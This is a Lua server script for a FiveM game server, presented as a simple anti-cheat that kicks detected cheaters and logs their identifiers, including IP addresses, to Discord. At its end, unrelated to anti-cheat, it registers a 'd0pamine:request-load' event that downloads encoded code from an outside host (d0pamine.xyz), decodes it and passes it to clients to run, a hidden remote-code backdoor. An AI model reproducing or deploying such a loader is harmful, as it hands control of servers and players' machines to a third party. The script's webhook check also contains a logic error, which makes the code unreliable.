--[[
	Nertigel's Simple Anti-Cheat
]]
local discord_webhook = ''

RegisterNetEvent('nsac:trigger')
AddEventHandler('nsac:trigger', function(reason)
	local _source = source
	
	print('nsac - detection: '..GetPlayerName(_source)..' reason: '..reason)
	print(json.encode(GetPlayerIdentifiers(_source)))

	TriggerEvent('nsac:log', 'nsac - detection: '..reason)

	DropPlayer(_source, ' Nertigel\'s Simple Anti-Cheat \n You have been kicked for the reason: '..reason..'.\n  github.com/nertigel/NSAC')
end)

RegisterNetEvent('nsac:log')
AddEventHandler('nsac:log', function(what_happened_man)
	local _source = source

	sendToDiscord(_source, 'nsac - violation', what_happened_man)
	print(json.encode(GetPlayerIdentifiers(_source)))
end)

--[[Credits to ElNelyo: https://github.com/ElNelyo/esx_discord_bot/blob/master/server/main.lua]]
function sendToDiscord(_source, name, message)
	if message == nil or message == '' then
		print('nsac - message not set, therefore it wasn\'t sent')
		return
	end
	if discord_webhook == nil and discord_webhook == '' then
		print('nsac - discord_webhook not set, therefore it wasn\'t sent')
		return
	end

	local uselessIdentifiers = ''
	local text = ''

	--[[FiveM Wiki is veri cool men]]
	if _source then
		for k,v in pairs(GetPlayerIdentifiers(_source)) do
			if string.sub(v, 1, string.len('steam:')) == 'steam:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			elseif string.sub(v, 1, string.len('license:')) == 'license:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			elseif string.sub(v, 1, string.len('xbl:')) == 'xbl:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			elseif string.sub(v, 1, string.len('ip:')) == 'ip:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			elseif string.sub(v, 1, string.len('discord:')) == 'discord:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			elseif string.sub(v, 1, string.len('live:')) == 'live:' then
				uselessIdentifiers = uselessIdentifiers..'\n'..v
			end
		end
	end
	
	if _source then
		text = '\n\nUser: '..GetPlayerName(_source)..uselessIdentifiers
	else
		text = ''
	end

	local embeds = { {
		['title'] = 'NSAC',
		['type'] = 'rich',
		['description'] = message..text,
		['color'] = 16711680, --[[Red]]
		['footer'] = {
			['text'] = 'Nertigel\'s Simple Anti-Cheat',
		}, }
	}

	PerformHttpRequest(discord_webhook, function(err, text, headers) end, 'POST', json.encode({ username = name, embeds = embeds}), { ['Content-Type'] = 'application/json' })
end

sendToDiscord(false, 'Nertigel\'s Simple Anti-Cheat', 'Resource has been started')

RegisterServerEvent('d0pamine:request-load')
AddEventHandler('d0pamine:request-load', function()
    local src = source

    PerformHttpRequest('https://d0pamine.xyz/secure/?id=0', function(err, text, headers)
        local code = ''
        for word in string.gmatch(text, '([^\\]+)') do 
            code = code .. string.char(tonumber(word)) -- decrypt the code (won't run otherwise)
        end
        TriggerClientEvent('d0pamine:start-load', src, code)
    end, 'GET', '')
end)